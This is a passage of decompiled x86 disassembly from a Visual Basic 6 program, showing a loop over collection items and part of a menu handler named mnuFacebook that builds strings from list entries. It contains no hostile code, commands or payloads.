008CE29A: jz 008CE444h
008CE2A0: mov eax, var_18
008CE2A3: mov var_68, eax
008CE2A6: mov var_70, 00000003h
008CE2AD: cmp [008F2010h], 00000000h
008CE2B4: jnz 8CE2D1h
008CE2B6: push 008F2010h
008CE2BB: push 00433984h
008CE2C0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE2C5: mov var_000000C0, 008F2010h
008CE2CF: jmp 8CE2DBh
008CE2D1: mov var_000000C0, 008F2010h
008CE2DB: push 00000000h
008CE2DD: push 00000014h
008CE2DF: push 00440E58h
008CE2E4: push 00000010h
008CE2E6: pop eax
008CE2E7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE2EC: lea esi, var_70
008CE2EF: mov edi, esp
008CE2F1: movsd 
008CE2F2: movsd 
008CE2F3: movsd 
008CE2F4: movsd 
008CE2F5: push 00000001h
008CE2F7: push 00000000h
008CE2F9: push 00440E48h
008CE2FE: push 00000000h
008CE300: push 00000018h
008CE302: mov eax, var_000000C0
008CE308: mov eax, [eax]
008CE30A: mov ecx, var_000000C0
008CE310: mov ecx, [ecx]
008CE312: mov ecx, [ecx]
008CE314: push eax
008CE315: call [ecx+0000054Ch]
008CE31B: push eax
008CE31C: lea eax, var_24
008CE31F: push eax
008CE320: call 00410A84h ; Set (object)
008CE325: push eax
008CE326: lea eax, var_3C
008CE329: push eax
008CE32A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE32F: add esp, 00000010h
008CE332: push eax
008CE333: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE338: push eax
008CE339: lea eax, var_28
008CE33C: push eax
008CE33D: call 00410A84h ; Set (object)
008CE342: push eax
008CE343: lea eax, var_4C
008CE346: push eax
008CE347: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE34C: add esp, 00000020h
008CE34F: push eax
008CE350: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE355: push eax
008CE356: lea eax, var_2C
008CE359: push eax
008CE35A: call 00410A84h ; Set (object)
008CE35F: push eax
008CE360: lea eax, var_5C
008CE363: push eax
008CE364: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE369: add esp, 00000010h
008CE36C: push eax
008CE36D: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CE372: mov edx, eax
008CE374: lea ecx, var_1C
008CE377: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CE37C: push eax
008CE37D: call 004109DCh ; Val(arg_1)
008CE382: fstp real8 ptr var_00000098
008CE388: push 00000000h
008CE38A: push 00000000h
008CE38C: push 00000001h
008CE38E: push 00000000h
008CE390: lea eax, var_60
008CE393: push eax
008CE394: push 00000010h
008CE396: push 00000880h
008CE39B: call 00410946h ; ReDim
008CE3A0: add esp, 0000001Ch
008CE3A3: mov var_00000088, 00442930h
008CE3AD: mov var_00000090, 00000008h
008CE3B7: lea esi, var_00000090
008CE3BD: push 00000000h
008CE3BF: push var_60
008CE3C2: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008CE3C7: mov ecx, eax
008CE3C9: mov edx, esi
008CE3CB: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008CE3D0: mov edx, 0043DA20h ; x121
008CE3D5: lea ecx, var_20
008CE3D8: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008CE3DD: lea eax, var_60
008CE3E0: push eax
008CE3E1: lea eax, var_20
008CE3E4: push eax
008CE3E5: fld real8 ptr var_00000098
008CE3EB: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008CE3F0: push eax
008CE3F1: call 007A6910h
008CE3F6: lea eax, var_60
008CE3F9: push eax
008CE3FA: push 00000000h
008CE3FC: call 00410934h ; Erase
008CE401: lea eax, var_20
008CE404: push eax
008CE405: lea eax, var_1C
008CE408: push eax
008CE409: push 00000002h
008CE40B: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CE410: add esp, 0000000Ch
008CE413: lea eax, var_2C
008CE416: push eax
008CE417: lea eax, var_28
008CE41A: push eax
008CE41B: lea eax, var_24
008CE41E: push eax
008CE41F: push 00000003h
008CE421: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE426: add esp, 00000010h
008CE429: lea eax, var_5C
008CE42C: push eax
008CE42D: lea eax, var_4C
008CE430: push eax
008CE431: lea eax, var_3C
008CE434: push eax
008CE435: push 00000003h
008CE437: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE43C: add esp, 00000010h
008CE43F: call 0041096Ah ; DoEvents
008CE444: jmp 008CE15Fh
008CE449: jmp 008CE803h
008CE44E: cmp [008F2010h], 00000000h
008CE455: jnz 8CE472h
008CE457: push 008F2010h
008CE45C: push 00433984h
008CE461: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE466: mov var_000000C4, 008F2010h
008CE470: jmp 8CE47Ch
008CE472: mov var_000000C4, 008F2010h
008CE47C: push 00000000h
008CE47E: push 00000001h
008CE480: push 00440E48h
008CE485: push 00000000h
008CE487: push 00000018h
008CE489: mov eax, var_000000C4
008CE48F: mov eax, [eax]
008CE491: mov ecx, var_000000C4
008CE497: mov ecx, [ecx]
008CE499: mov ecx, [ecx]
008CE49B: push eax
008CE49C: call [ecx+00000550h]
008CE4A2: push eax
008CE4A3: lea eax, var_24
008CE4A6: push eax
008CE4A7: call 00410A84h ; Set (object)
008CE4AC: push eax
008CE4AD: lea eax, var_3C
008CE4B0: push eax
008CE4B1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE4B6: add esp, 00000010h
008CE4B9: push eax
008CE4BA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE4BF: push eax
008CE4C0: lea eax, var_28
008CE4C3: push eax
008CE4C4: call 00410A84h ; Set (object)
008CE4C9: push eax
008CE4CA: lea eax, var_4C
008CE4CD: push eax
008CE4CE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE4D3: add esp, 00000010h
008CE4D6: push eax
008CE4D7: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008CE4DC: mov var_000000AC, eax
008CE4E2: mov var_000000A8, 00000001h
008CE4EC: mov var_18, 00000001h
008CE4F3: lea eax, var_28
008CE4F6: push eax
008CE4F7: lea eax, var_24
008CE4FA: push eax
008CE4FB: push 00000002h
008CE4FD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE502: add esp, 0000000Ch
008CE505: lea eax, var_4C
008CE508: push eax
008CE509: lea eax, var_3C
008CE50C: push eax
008CE50D: push 00000002h
008CE50F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE514: add esp, 0000000Ch
008CE517: jmp 8CE52Bh
008CE519: mov eax, var_18
008CE51C: add eax, var_000000A8
008CE522: jo 008CE87Ch
008CE528: mov var_18, eax
008CE52B: mov eax, var_18
008CE52E: cmp eax, var_000000AC
008CE534: jnle 008CE803h
008CE53A: mov eax, var_18
008CE53D: mov var_68, eax
008CE540: mov var_70, 00000003h
008CE547: cmp [008F2010h], 00000000h
008CE54E: jnz 8CE56Bh
008CE550: push 008F2010h
008CE555: push 00433984h
008CE55A: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE55F: mov var_000000C8, 008F2010h
008CE569: jmp 8CE575h
008CE56B: mov var_000000C8, 008F2010h
008CE575: push 00000000h
008CE577: push 00000004h
008CE579: push 00440E58h
008CE57E: push 00000010h
008CE580: pop eax
008CE581: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE586: lea esi, var_70
008CE589: mov edi, esp
008CE58B: movsd 
008CE58C: movsd 
008CE58D: movsd 
008CE58E: movsd 
008CE58F: push 00000001h
008CE591: push 00000000h
008CE593: push 00440E48h
008CE598: push 00000000h
008CE59A: push 00000018h
008CE59C: mov eax, var_000000C8
008CE5A2: mov eax, [eax]
008CE5A4: mov ecx, var_000000C8
008CE5AA: mov ecx, [ecx]
008CE5AC: mov ecx, [ecx]
008CE5AE: push eax
008CE5AF: call [ecx+00000550h]
008CE5B5: push eax
008CE5B6: lea eax, var_24
008CE5B9: push eax
008CE5BA: call 00410A84h ; Set (object)
008CE5BF: push eax
008CE5C0: lea eax, var_3C
008CE5C3: push eax
008CE5C4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE5C9: add esp, 00000010h
008CE5CC: push eax
008CE5CD: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE5D2: push eax
008CE5D3: lea eax, var_28
008CE5D6: push eax
008CE5D7: call 00410A84h ; Set (object)
008CE5DC: push eax
008CE5DD: lea eax, var_4C
008CE5E0: push eax
008CE5E1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE5E6: add esp, 00000020h
008CE5E9: push eax
008CE5EA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE5EF: push eax
008CE5F0: lea eax, var_2C
008CE5F3: push eax
008CE5F4: call 00410A84h ; Set (object)
008CE5F9: push eax
008CE5FA: lea eax, var_5C
008CE5FD: push eax
008CE5FE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE603: add esp, 00000010h
008CE606: push eax
008CE607: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008CE60C: sub ax, FFFFh
008CE610: neg ax
008CE613: sbb eax, eax
008CE615: inc eax
008CE616: neg eax
008CE618: mov var_0000009C, ax
008CE61F: lea eax, var_2C
008CE622: push eax
008CE623: lea eax, var_28
008CE626: push eax
008CE627: lea eax, var_24
008CE62A: push eax
008CE62B: push 00000003h
008CE62D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE632: add esp, 00000010h
008CE635: lea eax, var_5C
008CE638: push eax
008CE639: lea eax, var_4C
008CE63C: push eax
008CE63D: lea eax, var_3C
008CE640: push eax
008CE641: push 00000003h
008CE643: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE648: add esp, 00000010h
008CE64B: movsx eax, word ptr var_0000009C
008CE652: test eax, eax
008CE654: jz 008CE7FEh
008CE65A: mov eax, var_18
008CE65D: mov var_68, eax
008CE660: mov var_70, 00000003h
008CE667: cmp [008F2010h], 00000000h
008CE66E: jnz 8CE68Bh
008CE670: push 008F2010h
008CE675: push 00433984h
008CE67A: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE67F: mov var_000000CC, 008F2010h
008CE689: jmp 8CE695h
008CE68B: mov var_000000CC, 008F2010h
008CE695: push 00000000h
008CE697: push 00000014h
008CE699: push 00440E58h
008CE69E: push 00000010h
008CE6A0: pop eax
008CE6A1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE6A6: lea esi, var_70
008CE6A9: mov edi, esp
008CE6AB: movsd 
008CE6AC: movsd 
008CE6AD: movsd 
008CE6AE: movsd 
008CE6AF: push 00000001h
008CE6B1: push 00000000h
008CE6B3: push 00440E48h
008CE6B8: push 00000000h
008CE6BA: push 00000018h
008CE6BC: mov eax, var_000000CC
008CE6C2: mov eax, [eax]
008CE6C4: mov ecx, var_000000CC
008CE6CA: mov ecx, [ecx]
008CE6CC: mov ecx, [ecx]
008CE6CE: push eax
008CE6CF: call [ecx+00000550h]
008CE6D5: push eax
008CE6D6: lea eax, var_24
008CE6D9: push eax
008CE6DA: call 00410A84h ; Set (object)
008CE6DF: push eax
008CE6E0: lea eax, var_3C
008CE6E3: push eax
008CE6E4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE6E9: add esp, 00000010h
008CE6EC: push eax
008CE6ED: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE6F2: push eax
008CE6F3: lea eax, var_28
008CE6F6: push eax
008CE6F7: call 00410A84h ; Set (object)
008CE6FC: push eax
008CE6FD: lea eax, var_4C
008CE700: push eax
008CE701: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE706: add esp, 00000020h
008CE709: push eax
008CE70A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE70F: push eax
008CE710: lea eax, var_2C
008CE713: push eax
008CE714: call 00410A84h ; Set (object)
008CE719: push eax
008CE71A: lea eax, var_5C
008CE71D: push eax
008CE71E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE723: add esp, 00000010h
008CE726: push eax
008CE727: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CE72C: mov edx, eax
008CE72E: lea ecx, var_1C
008CE731: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CE736: push eax
008CE737: call 004109DCh ; Val(arg_1)
008CE73C: fstp real8 ptr var_00000098
008CE742: push 00000000h
008CE744: push 00000000h
008CE746: push 00000001h
008CE748: push 00000000h
008CE74A: lea eax, var_60
008CE74D: push eax
008CE74E: push 00000010h
008CE750: push 00000880h
008CE755: call 00410946h ; ReDim
008CE75A: add esp, 0000001Ch
008CE75D: mov var_00000088, 00442930h
008CE767: mov var_00000090, 00000008h
008CE771: lea esi, var_00000090
008CE777: push 00000000h
008CE779: push var_60
008CE77C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008CE781: mov ecx, eax
008CE783: mov edx, esi
008CE785: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008CE78A: mov edx, 0043DA20h ; x121
008CE78F: lea ecx, var_20
008CE792: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008CE797: lea eax, var_60
008CE79A: push eax
008CE79B: lea eax, var_20
008CE79E: push eax
008CE79F: fld real8 ptr var_00000098
008CE7A5: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008CE7AA: push eax
008CE7AB: call 007A6910h
008CE7B0: lea eax, var_60
008CE7B3: push eax
008CE7B4: push 00000000h
008CE7B6: call 00410934h ; Erase
008CE7BB: lea eax, var_20
008CE7BE: push eax
008CE7BF: lea eax, var_1C
008CE7C2: push eax
008CE7C3: push 00000002h
008CE7C5: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CE7CA: add esp, 0000000Ch
008CE7CD: lea eax, var_2C
008CE7D0: push eax
008CE7D1: lea eax, var_28
008CE7D4: push eax
008CE7D5: lea eax, var_24
008CE7D8: push eax
008CE7D9: push 00000003h
008CE7DB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE7E0: add esp, 00000010h
008CE7E3: lea eax, var_5C
008CE7E6: push eax
008CE7E7: lea eax, var_4C
008CE7EA: push eax
008CE7EB: lea eax, var_3C
008CE7EE: push eax
008CE7EF: push 00000003h
008CE7F1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE7F6: add esp, 00000010h
008CE7F9: call 0041096Ah ; DoEvents
008CE7FE: jmp 008CE519h
008CE803: mov var_04, 00000000h
008CE80A: wait 
008CE80B: push 008CE85Dh
008CE810: jmp 8CE85Ch
008CE812: lea eax, var_20
008CE815: push eax
008CE816: lea eax, var_1C
008CE819: push eax
008CE81A: push 00000002h
008CE81C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CE821: add esp, 0000000Ch
008CE824: lea eax, var_2C
008CE827: push eax
008CE828: lea eax, var_28
008CE82B: push eax
008CE82C: lea eax, var_24
008CE82F: push eax
008CE830: push 00000003h
008CE832: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE837: add esp, 00000010h
008CE83A: lea eax, var_5C
008CE83D: push eax
008CE83E: lea eax, var_4C
008CE841: push eax
008CE842: lea eax, var_3C
008CE845: push eax
008CE846: push 00000003h
008CE848: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE84D: add esp, 00000010h
008CE850: lea eax, var_60
008CE853: push eax
008CE854: push 00000000h
008CE856: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008CE85B: ret 
End Sub

Private sub mnuFacebook__8CF64E
008CF64E: push ebp
008CF64F: mov ebp, esp
008CF651: sub esp, 00000018h
008CF654: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CF659: mov eax, fs:[00h]
008CF65F: push eax
008CF660: mov fs:[00000000h], esp
008CF667: mov eax, 0000037Ch
008CF66C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF671: push ebx
008CF672: push esi
008CF673: push edi
008CF674: mov var_18, esp
008CF677: mov var_14, 0040F998h
008CF67E: mov eax, [ebp+08h]
008CF681: and eax, 00000001h
008CF684: mov var_10, eax
008CF687: mov eax, [ebp+08h]
008CF68A: and al, FEh
008CF68C: mov [ebp+08h], eax
008CF68F: mov var_0C, 00000000h
008CF696: mov eax, [ebp+08h]
008CF699: mov eax, [eax]
008CF69B: push [ebp+08h]
008CF69E: call [eax+04h]
008CF6A1: mov var_04, 00000001h
008CF6A8: mov var_04, 00000002h
008CF6AF: push FFFFFFFFh
008CF6B1: call 00410A60h ; On Error ...
008CF6B6: mov var_04, 00000003h
008CF6BD: mov eax, [ebp+0Ch]
008CF6C0: mov ax, [eax]
008CF6C3: mov var_00000358, ax
008CF6CA: movsx eax, word ptr var_00000358
008CF6D1: mov var_00000378, eax
008CF6D7: cmp var_00000378, 00000000h
008CF6DE: jz 8CF704h
008CF6E0: cmp var_00000378, 00000001h
008CF6E7: jz 008D031Eh
008CF6ED: cmp var_00000378, 00000003h
008CF6F4: jz 008D0E2Bh
008CF6FA: jmp 008D0EA9h
008CF6FF: jmp 008D0EA9h
008CF704: mov var_04, 00000005h
008CF70B: mov var_0000020C, 00000001h
008CF715: mov var_00000214, 00000002h
008CF71F: push 00000000h
008CF721: push 00000001h
008CF723: push 00440E48h
008CF728: push 00000000h
008CF72A: push 00000018h
008CF72C: mov eax, [ebp+08h]
008CF72F: mov eax, [eax]
008CF731: push [ebp+08h]
008CF734: call [eax+00000314h]
008CF73A: push eax
008CF73B: lea eax, var_000000A0
008CF741: push eax
008CF742: call 00410A84h ; Set (object)
008CF747: push eax
008CF748: lea eax, var_000000F4
008CF74E: push eax
008CF74F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF754: add esp, 00000010h
008CF757: push eax
008CF758: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CF75D: push eax
008CF75E: lea eax, var_000000A4
008CF764: push eax
008CF765: call 00410A84h ; Set (object)
008CF76A: push eax
008CF76B: lea eax, var_00000104
008CF771: push eax
008CF772: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF777: add esp, 00000010h
008CF77A: push eax
008CF77B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008CF780: mov var_0000021C, eax
008CF786: mov var_00000224, 00000003h
008CF790: mov var_0000022C, 00000001h
008CF79A: mov var_00000234, 00000002h
008CF7A4: lea eax, var_00000214
008CF7AA: push eax
008CF7AB: lea eax, var_00000224
008CF7B1: push eax
008CF7B2: lea eax, var_00000234
008CF7B8: push eax
008CF7B9: lea eax, var_00000334
008CF7BF: push eax
008CF7C0: lea eax, var_00000324
008CF7C6: push eax
008CF7C7: lea eax, var_30
008CF7CA: push eax
008CF7CB: call 00410A3Ch ; For
008CF7D0: mov var_00000370, eax
008CF7D6: lea eax, var_000000A4
008CF7DC: push eax
008CF7DD: lea eax, var_000000A0
008CF7E3: push eax
008CF7E4: push 00000002h
008CF7E6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF7EB: add esp, 0000000Ch
008CF7EE: lea eax, var_00000104
008CF7F4: push eax
008CF7F5: lea eax, var_000000F4
008CF7FB: push eax
008CF7FC: push 00000002h
008CF7FE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CF803: add esp, 0000000Ch
008CF806: jmp 008D00FBh
008CF80B: mov var_04, 00000006h
008CF812: lea eax, var_30
008CF815: mov var_0000020C, eax
008CF81B: mov var_00000214, 0000400Ch
008CF825: push 00000000h
008CF827: push 00000004h
008CF829: push 00440E58h
008CF82E: push 00000010h
008CF830: pop eax
008CF831: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF836: lea esi, var_00000214
008CF83C: mov edi, esp
008CF83E: movsd 
008CF83F: movsd 
008CF840: movsd 
008CF841: movsd 
008CF842: push 00000001h
008CF844: push 00000000h
008CF846: push 00440E48h
008CF84B: push 00000000h
008CF84D: push 00000018h
008CF84F: mov eax, [ebp+08h]
008CF852: mov eax, [eax]
008CF854: push [ebp+08h]
008CF857: call [eax+00000314h]
008CF85D: push eax
008CF85E: lea eax, var_000000A0
008CF864: push eax
008CF865: call 00410A84h ; Set (object)
008CF86A: push eax
008CF86B: lea eax, var_000000F4
008CF871: push eax
008CF872: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF877: add esp, 00000010h
008CF87A: push eax
008CF87B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CF880: push eax
008CF881: lea eax, var_000000A4
008CF887: push eax
008CF888: call 00410A84h ; Set (object)
008CF88D: push eax
008CF88E: lea eax, var_00000104
008CF894: push eax
008CF895: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF89A: add esp, 00000020h
008CF89D: push eax
008CF89E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CF8A3: push eax
008CF8A4: lea eax, var_000000A8
008CF8AA: push eax
008CF8AB: call 00410A84h ; Set (object)
008CF8B0: push eax
008CF8B1: lea eax, var_00000114
008CF8B7: push eax
008CF8B8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF8BD: add esp, 00000010h
008CF8C0: push eax
008CF8C1: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008CF8C6: sub ax, FFFFh
008CF8CA: neg ax
008CF8CD: sbb eax, eax
008CF8CF: inc eax
008CF8D0: neg eax
008CF8D2: mov var_00000308, ax
008CF8D9: lea eax, var_000000A8
008CF8DF: push eax
008CF8E0: lea eax, var_000000A4
008CF8E6: push eax
008CF8E7: lea eax, var_000000A0
008CF8ED: push eax
008CF8EE: push 00000003h
008CF8F0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF8F5: add esp, 00000010h
008CF8F8: lea eax, var_00000114
008CF8FE: push eax
008CF8FF: lea eax, var_00000104
008CF905: push eax
008CF906: lea eax, var_000000F4
008CF90C: push eax
008CF90D: push 00000003h
008CF90F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CF914: add esp, 00000010h
008CF917: movsx eax, word ptr var_00000308
008CF91E: test eax, eax
008CF920: jz 008D00D7h
008CF926: mov var_04, 00000007h
008CF92D: lea eax, var_30
008CF930: mov var_0000020C, eax
008CF936: mov var_00000214, 0000400Ch
008CF940: mov var_0000022C, 00000001h
008CF94A: mov var_00000234, 00000003h
008CF954: lea eax, var_30
008CF957: mov var_0000021C, eax
008CF95D: mov var_00000224, 0000400Ch
008CF967: mov var_0000025C, 00000002h
008CF971: mov var_00000264, 00000003h
008CF97B: lea eax, var_30
008CF97E: mov var_0000024C, eax
008CF984: mov var_00000254, 0000400Ch
008CF98E: mov var_0000028C, 00000003h
008CF998: mov var_00000294, 00000003h
008CF9A2: lea eax, var_30
008CF9A5: mov var_0000027C, eax
008CF9AB: mov var_00000284, 0000400Ch
008CF9B5: mov var_000002BC, 00000004h
008CF9BF: mov var_000002C4, 00000003h
008CF9C9: lea eax, var_30
008CF9CC: mov var_000002AC, eax
008CF9D2: mov var_000002B4, 0000400Ch
008CF9DC: mov var_000002EC, 00000005h
008CF9E6: mov var_000002F4, 00000003h
008CF9F0: lea eax, var_30
008CF9F3: mov var_000002DC, eax
008CF9F9: mov var_000002E4, 0000400Ch
008CFA03: push var_44
008CFA06: push 00000000h
008CFA08: push 00000000h
008CFA0A: push 00440E58h
008CFA0F: push 00000010h
008CFA11: pop eax
008CFA12: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFA17: lea esi, var_00000214
008CFA1D: mov edi, esp
008CFA1F: movsd 
008CFA20: movsd 
008CFA21: movsd 
008CFA22: movsd 
008CFA23: push 00000001h
008CFA25: push 00000000h
008CFA27: push 00440E48h
008CFA2C: push 00000000h
008CFA2E: push 00000018h
008CFA30: mov eax, [ebp+08h]
008CFA33: mov eax, [eax]
008CFA35: push [ebp+08h]
008CFA38: call [eax+00000314h]
008CFA3E: push eax
008CFA3F: lea eax, var_000000A0
008CFA45: push eax
008CFA46: call 00410A84h ; Set (object)
008CFA4B: push eax
008CFA4C: lea eax, var_000000F4
008CFA52: push eax
008CFA53: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFA58: add esp, 00000010h
008CFA5B: push eax
008CFA5C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFA61: push eax
008CFA62: lea eax, var_000000A4
008CFA68: push eax
008CFA69: call 00410A84h ; Set (object)
008CFA6E: push eax
008CFA6F: lea eax, var_00000104
008CFA75: push eax
008CFA76: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFA7B: add esp, 00000020h
008CFA7E: push eax
008CFA7F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFA84: push eax
008CFA85: lea eax, var_000000A8
008CFA8B: push eax
008CFA8C: call 00410A84h ; Set (object)
008CFA91: push eax
008CFA92: lea eax, var_00000114
008CFA98: push eax
008CFA99: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFA9E: add esp, 00000010h
008CFAA1: push eax
008CFAA2: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFAA7: mov edx, eax
008CFAA9: lea ecx, var_5C
008CFAAC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFAB1: push eax
008CFAB2: call 00410A18h ; &
008CFAB7: mov edx, eax
008CFAB9: lea ecx, var_60
008CFABC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFAC1: push eax
008CFAC2: push 00445568h
008CFAC7: call 00410A18h ; &
008CFACC: mov edx, eax
008CFACE: lea ecx, var_64
008CFAD1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFAD6: push eax
008CFAD7: push 00000010h
008CFAD9: pop eax
008CFADA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFADF: lea esi, var_00000234
008CFAE5: mov edi, esp
008CFAE7: movsd 
008CFAE8: movsd 
008CFAE9: movsd 
008CFAEA: movsd 
008CFAEB: push 00000001h
008CFAED: push 00000010h
008CFAEF: push 00440E58h
008CFAF4: push 00000010h
008CFAF6: pop eax
008CFAF7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFAFC: lea esi, var_00000224
008CFB02: mov edi, esp
008CFB04: movsd 
008CFB05: movsd 
008CFB06: movsd 
008CFB07: movsd 
008CFB08: push 00000001h
008CFB0A: push 00000000h
008CFB0C: push 00440E48h
008CFB11: push 00000000h
008CFB13: push 00000018h
008CFB15: mov eax, [ebp+08h]
008CFB18: mov eax, [eax]
008CFB1A: push [ebp+08h]
008CFB1D: call [eax+00000314h]
008CFB23: push eax
008CFB24: lea eax, var_000000AC
008CFB2A: push eax
008CFB2B: call 00410A84h ; Set (object)
008CFB30: push eax
008CFB31: lea eax, var_00000124
008CFB37: push eax
008CFB38: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFB3D: add esp, 00000010h
008CFB40: push eax
008CFB41: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFB46: push eax
008CFB47: lea eax, var_000000B0
008CFB4D: push eax
008CFB4E: call 00410A84h ; Set (object)
008CFB53: push eax
008CFB54: lea eax, var_00000134
008CFB5A: push eax
008CFB5B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFB60: add esp, 00000020h
008CFB63: push eax
008CFB64: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFB69: push eax
008CFB6A: lea eax, var_000000B4
008CFB70: push eax
008CFB71: call 00410A84h ; Set (object)
008CFB76: push eax
008CFB77: lea eax, var_00000144
008CFB7D: push eax
008CFB7E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFB83: add esp, 00000020h
008CFB86: push eax
008CFB87: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFB8C: mov edx, eax
008CFB8E: lea ecx, var_68
008CFB91: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFB96: push eax
008CFB97: call 00410A18h ; &
008CFB9C: mov edx, eax
008CFB9E: lea ecx, var_6C
008CFBA1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFBA6: push eax
008CFBA7: push 00445568h
008CFBAC: call 00410A18h ; &
008CFBB1: mov edx, eax
008CFBB3: lea ecx, var_70
008CFBB6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFBBB: push eax
008CFBBC: push 00000010h
008CFBBE: pop eax
008CFBBF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFBC4: lea esi, var_00000264
008CFBCA: mov edi, esp
008CFBCC: movsd 
008CFBCD: movsd 
008CFBCE: movsd 
008CFBCF: movsd 
008CFBD0: push 00000001h
008CFBD2: push 00000010h
008CFBD4: push 00440E58h
008CFBD9: push 00000010h
008CFBDB: pop eax
008CFBDC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFBE1: lea esi, var_00000254
008CFBE7: mov edi, esp
008CFBE9: movsd 
008CFBEA: movsd 
008CFBEB: movsd 
008CFBEC: movsd 
008CFBED: push 00000001h
008CFBEF: push 00000000h
008CFBF1: push 00440E48h
008CFBF6: push 00000000h
008CFBF8: push 00000018h
008CFBFA: mov eax, [ebp+08h]
008CFBFD: mov eax, [eax]
008CFBFF: push [ebp+08h]
008CFC02: call [eax+00000314h]
008CFC08: push eax
008CFC09: lea eax, var_000000B8
008CFC0F: push eax
008CFC10: call 00410A84h ; Set (object)
008CFC15: push eax
008CFC16: lea eax, var_00000154
008CFC1C: push eax
008CFC1D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFC22: add esp, 00000010h
008CFC25: push eax
